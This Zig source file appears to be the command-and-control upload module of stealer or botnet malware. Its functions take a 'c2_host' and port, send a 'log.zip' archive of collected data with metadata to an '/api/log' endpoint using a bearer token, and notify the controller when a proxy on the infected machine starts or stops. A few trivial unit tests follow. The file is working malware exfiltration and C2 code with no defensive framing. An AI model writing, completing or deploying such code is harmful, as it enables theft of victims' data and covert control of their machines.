const std = @import("std");
const http = @import("http.zig");

pub const PanelError = error{
    UploadFailed,
    InvalidResponse,
    ApiError,
};

pub fn uploadLog(
    allocator: std.mem.Allocator,
    c2_host: []const u8,
    c2_port: u16,
    token: []const u8,
    archive_data: []const u8,
    metadata: []const u8,
) !void {
    const boundary = "----MiragePanelBoundary8MA4YWxkTrZu0gX";

    var body = try std.ArrayList(u8).initCapacity(allocator, 4096);
    defer body.deinit(allocator);

    try body.appendSlice(allocator, "--");
    try body.appendSlice(allocator, boundary);
    try body.appendSlice(allocator, "\r\n");
    try body.appendSlice(allocator, "Content-Disposition: form-data; name=\"archive\"; filename=\"log.zip\"\r\n");
    try body.appendSlice(allocator, "Content-Type: application/octet-stream\r\n\r\n");
    try body.appendSlice(allocator, archive_data);
    try body.appendSlice(allocator, "\r\n");

    try body.appendSlice(allocator, "--");
    try body.appendSlice(allocator, boundary);
    try body.appendSlice(allocator, "\r\n");
    try body.appendSlice(allocator, "Content-Disposition: form-data; name=\"metadata\"\r\n\r\n");
    try body.appendSlice(allocator, metadata);
    try body.appendSlice(allocator, "\r\n");

    try body.appendSlice(allocator, "--");
    try body.appendSlice(allocator, boundary);
    try body.appendSlice(allocator, "--\r\n");

    var auth_header_buf: [512]u8 = undefined;
    const auth_header = try std.fmt.bufPrint(&auth_header_buf, "Bearer {s}", .{token});

    var client = http.HttpClient.connect(c2_host, c2_port) catch return error.UploadFailed;
    defer client.close();

    const headers = [_]http.Header{
        .{ .name = "Authorization", .value = auth_header },
    };

    const resp = client.postMultipart("/api/log", &headers, boundary, body.items) catch return error.UploadFailed;
    defer resp.deinit();

    // ponytail: accept 2xx range; retry with backoff for 5xx if
    // delivery guarantees become critical. Current behavior treats
    // any non-2xx as failure.
    if (resp.status < 200 or resp.status >= 300) return error.ApiError;
}

pub fn sendProxyStart(allocator: std.mem.Allocator, c2_host: []const u8, c2_port: u16, token: []const u8, proxy_port: u16) !void {
    var body_buf: [256]u8 = undefined;
    const json = try std.fmt.bufPrint(&body_buf, "{{\"port\":{d}}}", .{proxy_port});

    var auth_buf: [512]u8 = undefined;
    const auth = try std.fmt.bufPrint(&auth_buf, "Bearer {s}", .{token});

    var client = http.HttpClient.connect(c2_host, c2_port) catch return error.UploadFailed;
    defer client.close();

    var cl_buf: [20]u8 = undefined;
    const cl_str = try std.fmt.bufPrint(&cl_buf, "{d}", .{json.len});

    var req = std.ArrayList(u8).initCapacity(allocator, 512) catch return error.UploadFailed;
    defer req.deinit(allocator);
    try req.appendSlice(allocator, "POST /api/proxy/start HTTP/1.1\r\n");
    try req.appendSlice(allocator, "Host: ");
    try req.appendSlice(allocator, c2_host);
    try req.appendSlice(allocator, "\r\n");
    try req.appendSlice(allocator, "Authorization: ");
    try req.appendSlice(allocator, auth);
    try req.appendSlice(allocator, "\r\n");
    try req.appendSlice(allocator, "Content-Type: application/json\r\n");
    try req.appendSlice(allocator, "Content-Length: ");
    try req.appendSlice(allocator, cl_str);
    try req.appendSlice(allocator, "\r\n");
    try req.appendSlice(allocator, "Connection: close\r\n\r\n");
    try req.appendSlice(allocator, json);

    client.socket.send(req.items) catch return error.UploadFailed;
    const resp = client.readResponse() catch return error.UploadFailed;
    defer resp.deinit();
    if (resp.status != 200) return error.ApiError;
}

pub fn sendProxyStop(allocator: std.mem.Allocator, c2_host: []const u8, c2_port: u16, token: []const u8) !void {
    _ = allocator;
    var auth_buf: [512]u8 = undefined;
    const auth = try std.fmt.bufPrint(&auth_buf, "Bearer {s}", .{token});

    var client = http.HttpClient.connect(c2_host, c2_port) catch return error.UploadFailed;
    defer client.close();

    const json = "{\"action\":\"stop\"}";
    var cl_buf: [20]u8 = undefined;
    const cl_str = try std.fmt.bufPrint(&cl_buf, "{d}", .{json.len});

    var req = std.ArrayList(u8).initCapacity(std.heap.page_allocator, 512) catch return error.UploadFailed;
    defer req.deinit(std.heap.page_allocator);
    try req.appendSlice(std.heap.page_allocator, "POST /api/proxy/stop HTTP/1.1\r\n");
    try req.appendSlice(std.heap.page_allocator, "Host: ");
    try req.appendSlice(std.heap.page_allocator, c2_host);
    try req.appendSlice(std.heap.page_allocator, "\r\n");
    try req.appendSlice(std.heap.page_allocator, "Authorization: ");
    try req.appendSlice(std.heap.page_allocator, auth);
    try req.appendSlice(std.heap.page_allocator, "\r\n");
    try req.appendSlice(std.heap.page_allocator, "Content-Type: application/json\r\n");
    try req.appendSlice(std.heap.page_allocator, "Content-Length: ");
    try req.appendSlice(std.heap.page_allocator, cl_str);
    try req.appendSlice(std.heap.page_allocator, "\r\n");
    try req.appendSlice(std.heap.page_allocator, "Connection: close\r\n\r\n");
    try req.appendSlice(std.heap.page_allocator, json);

    client.socket.send(req.items) catch return error.UploadFailed;
    const resp = client.readResponse() catch return error.UploadFailed;
    defer resp.deinit();
    if (resp.status != 200) return error.ApiError;
}

test "uploadLog auth header format" {
    var buf: [512]u8 = undefined;
    const token = "test-token-123";
    const auth = try std.fmt.bufPrint(&buf, "Bearer {s}", .{token});
    try std.testing.expectEqualStrings("Bearer test-token-123", auth);
}

test "uploadLog parameter types" {
    try std.testing.expect(@TypeOf(uploadLog) == fn (
        std.mem.Allocator,
        []const u8,
        u16,
        []const u8,
        []const u8,
        []const u8,
    ) anyerror!void);
}

test "multipart boundary format" {
    const boundary = "----MiragePanelBoundary8MA4YWxkTrZu0gX";
    try std.testing.expect(boundary.len > 10);
}
